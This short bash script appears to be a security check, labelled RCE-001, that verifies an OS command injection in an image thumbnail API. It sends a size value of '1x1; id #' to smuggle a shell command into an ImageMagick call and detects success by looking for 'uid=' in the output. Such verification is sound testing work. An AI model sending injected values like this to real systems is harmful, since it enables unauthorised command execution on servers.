#!/usr/bin/env bash
# RCE-001: OS command injection via ImageMagick shell-out. The `size` field is
# concatenated into `sh -c "convert ... -resize <size> ..."`, so `; id` runs.
# We grep for `uid=` (real command output) rather than a literal marker, because
# the safe arg-slice `convert` echoes the bad -resize argument back verbatim.
set -euo pipefail
source "$(dirname "$0")/_lib.sh"
curl -s -X POST "$TARGET/api/images/thumbnail" -H 'content-type: application/json' \
  -d '{"size":"1x1; id #"}' | grep -q 'uid='
